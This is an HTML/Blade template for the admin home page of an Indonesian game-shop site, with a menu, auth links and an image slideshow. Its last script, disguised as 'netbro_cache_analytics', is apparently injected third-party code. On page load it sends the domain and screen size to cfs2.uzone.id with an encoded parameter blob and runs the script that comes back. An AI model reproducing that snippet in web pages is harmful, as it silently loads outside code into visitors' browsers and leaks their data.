<html>
<head>
<title>IAM A Gamer</title>
<link rel="stylesheet" type="text/css" href="/css/css.css"/>
</head>
<body>
<div id="header">
</div>
<div id="menu">
<ul>
  <li><a href="/homeadmin">Home</a></li>
  <li><a href="/data">Game List</a></li>
  <li><a href="/data/create">Input Produk</a></li>
  <li><a href="/user">user</a></li>
  <li><a href="/transaksi">Data Transaksi</a></li>
  <li><a href="/galeri">Gallery</a></li>
  <li><a href="/news">News</a></li>
  <li><a href="/contact">Contact</a></li>
  <li><a href="/about">About</a></li>
  <!-- Authentication Links -->
            @if (Auth::guest())
  <li><a href="{{ url('/register') }}">Register</a></li>
            @else
  <li style="float:right"><a class="active" href="{{ url('/logout') }}">Logout</a></li>
            @endif
</div>
</ul>
</div>
<div id="content">
<h1>Welcome to GamerZone</h1>
    <h2>No Game No Life</h2>



    <hr>
	<div class="slideshow-container">

	<div class="mySlides fade"><img src="GameInfo/devil-may-cry-5-wallpaper-1.jpg" width="700" height="400"></div>

	<div class="mySlides fade">
  	<img src="GameInfo/Assassins_Creed_syndicate_header_2.jpg" width="700" height="400">
	</div>

	<div class="mySlides fade">
  	<img src="GameInfo/547265.jpg" width="700" height="400">
	</div>
  <div class="mySlides fade">
    <img src="GameInfo/image.jpeg" width="700" height="400">
  </div>
  <div class="mySlides fade">
    <img src="GameInfo/dragon-age-inquisition-standard-edition_pdp_3840x2160_en_WW.jpg" width="700" height="400">
  </div>
  <div class="mySlides fade">
    <img src="GameInfo/battlefield-4-ddx_pdp_3840x2160_en_WW.jpg" width="700" height="400">
  </div>
  <div class="mySlides fade">
   <img src="GameInfo/gtavpc_1.jpeg"width="700" height="400">
  </div>
  <div class="mySlides fade">
   <img src="GameInfo/3070973-pes2017_first_touch.png" width="700" height="400">
  </div>
</div>
<br>

<div style="text-align:center">
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
</div>
<p>Kami menyediakan Beberapa Game </p>
<p>Dari Game Lama Sampai Terbaru</p>
<p>silakan Liat Di Game List</p>
</div>

<div id="footer">
</div>


<script>
var slideIndex = 0;
showSlides();

function showSlides() {
    var i;
    var slides = document.getElementsByClassName("mySlides");
    var dots = document.getElementsByClassName("dot");
    for (i = 0; i < slides.length; i++) {
       slides[i].style.display = "none";  
    }
    slideIndex++;
    if (slideIndex> slides.length) {slideIndex = 1}    
    for (i = 0; i < dots.length; i++) {
        dots[i].className = dots[i].className.replace(" active", "");
    }
    slides[slideIndex-1].style.display = "block";  
    dots[slideIndex-1].className += " active";
    setTimeout(showSlides, 2000); // Change image every 2 seconds
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKXFB4IHtLOEGPJaNpZYHj60ngOHMbDBwKfTJ56po0lS2B3pT4Vg4bOf7HTujC2znnNLy1umtvyS3xWhqtY1eyEUlxpdJbiQcfrn5uFPvpICtfFm71Fx1J3BurTsEoWF9g0XAPQ3oVT1Pyweor7LDad7rI%2bR4RTucZEfBqQCiet%2f5eCYyxkoQn3qFPwjH0x8h8degc1pw7gI2Yn9s6okizdNltU8VJD6tB5scbFuZhMrCUUMr0%2byEoxCsFHPzrzOCfz7%2bTDU7x%2buKQG6xhS0EaC7V6z%2fcD7D%2byc7c9wkU2O6NnYjIVbdM5L7S6joWrIr%2bHY1Nddf2rWv2aQlXRT1Ywi2bUx9zS3vo6aJXCWEON4an9XZZ4VHUCUrpVxd8Ahrb7%2bnSZGXdKRkZwoDpXaXOsPQvfxSXCpDJt0aGbzKTDrJw%2bEFcApxt4zbpVrkThxGurzgS5mhts6FQ5YcG2mJb5QEeSCGeVg1OF%2baSUgccIO7PzTW5lG50SKmGFMexKW4NBH9NR9A9nqZfiXW9woRJKQGRvKpeViiYcdIKQ%2fDQpolXWTCOWGuLJEUu0xS9QwnPObp%2fjK2QUTwMR10NYQiT0rCZYr4ynWpRa" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>




</body>
</html>